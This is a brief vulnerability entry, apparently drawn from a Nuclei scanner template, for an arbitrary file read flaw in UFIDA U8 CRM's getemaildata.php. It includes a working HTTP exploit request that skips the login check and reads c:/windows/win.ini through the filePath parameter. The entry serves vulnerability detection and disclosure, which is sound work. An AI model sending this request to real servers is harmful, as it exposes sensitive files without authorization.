# Vulnerability: UFIDA U8 CRM getemaildata.php - Arbitrary File Read
**Classification:** CWE-22,CWE-73
**Source:** Nuclei Template (`yonyou-u8-crm-lfi.yaml`)

## Description
There is an arbitrary file reading vulnerability in getemaildata.php of UFIDA U8 CRM customer relationship management system. An attacker can obtain sensitive files in the server through the vulnerability.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /ajax/getemaildata.php?DontCheckLogin=1&filePath=c:/windows/win.ini HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json
```

